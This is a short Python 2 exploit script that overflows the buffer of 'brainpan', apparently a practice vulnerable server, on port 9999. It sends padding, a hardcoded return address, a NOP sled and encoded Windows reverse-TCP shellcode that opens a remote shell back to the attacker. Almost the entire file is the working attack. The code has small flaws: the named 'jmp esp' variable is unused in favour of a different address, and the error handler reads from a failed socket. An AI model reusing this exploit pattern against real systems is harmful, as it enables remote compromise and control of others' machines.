#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: windows/shell/reverse_tcp
shellcode = ("\xd9\xd0\xb8\xec\xcb\x7b\xc2\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x4f\x31\x43\x19\x03\x43\x19\x83\xc3\x04\x0e\x3e\x87\x2a\x47"
"\xc1\x78\xab\x37\x4b\x9d\x9a\x65\x2f\xd5\x8f\xb9\x3b\xbb\x23"
"\x32\x69\x28\xb7\x36\xa6\x5f\x70\xfc\x90\x6e\x81\x31\x1d\x3c"
"\x41\x50\xe1\x3f\x96\xb2\xd8\x8f\xeb\xb3\x1d\xed\x04\xe1\xf6"
"\x79\xb6\x15\x72\x3f\x0b\x14\x54\x4b\x33\x6e\xd1\x8c\xc0\xc4"
"\xd8\xdc\x79\x53\x92\xc4\xf2\x3b\x03\xf4\xd7\x58\x7f\xbf\x5c"
"\xaa\x0b\x3e\xb5\xe3\xf4\x70\xf9\xaf\xca\xbc\xf4\xae\x0b\x7a"
"\xe7\xc5\x67\x78\x9a\xdd\xb3\x02\x40\x68\x26\xa4\x03\xca\x82"
"\x54\xc7\x8c\x41\x5a\xac\xdb\x0e\x7f\x33\x08\x25\x7b\xb8\xaf"
"\xea\x0d\xfa\x8b\x2e\x55\x58\xb2\x77\x33\x0f\xcb\x68\x9b\xf0"
"\x69\xe2\x0e\xe4\x0b\xa9\x46\xc9\x21\x52\x97\x45\x32\x21\xa5"
"\xca\xe8\xad\x85\x83\x36\x29\xe9\xb9\x8e\xa5\x14\x42\xee\xec"
"\xd2\x16\xbe\x86\xf3\x16\x55\x57\xfb\xc2\xf9\x07\x53\xbd\xb9"
"\xf7\x13\x6d\x51\x12\x9c\x52\x41\x1d\x76\xe5\x46\x8a\xb9\x5e"
"\x42\x4a\x52\x9d\x52\x5d\xfe\x28\xb4\x37\xee\x7c\x6f\xa0\x97"
"\x24\xfb\x51\x57\xf3\x6b\xf1\xca\x98\x6b\x7c\xf7\x36\x3c\x29"
"\xc9\x4e\xa8\xc7\x70\xf9\xce\x15\xe4\xc2\x4a\xc2\xd5\xcd\x53"
"\x87\x62\xea\x43\x51\x6a\xb6\x37\x0d\x3d\x60\xe1\xeb\x97\xc2"
"\x5b\xa2\x44\x8d\x0b\x33\xa7\x0e\x4d\x3c\xe2\xf8\xb1\x8d\x5b"
"\xbd\xce\x22\x0c\x49\xb7\x5e\xac\xb6\x62\xdb\xdc\xfc\x2e\x4a"
"\x75\x59\xbb\xce\x18\x5a\x16\x0c\x25\xd9\x92\xed\xd2\xc1\xd7"
"\xe8\x9f\x45\x04\x81\xb0\x23\x2a\x36\xb0\x61")

#jmp esp found at 0x7e429353
ret = "\x53\x93\x42\x7e"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 520 + '\x90' * 4 + '\xf0\x12\x17\x31' + '\x90' * 50 + shellcode

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("192.168.10.101",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




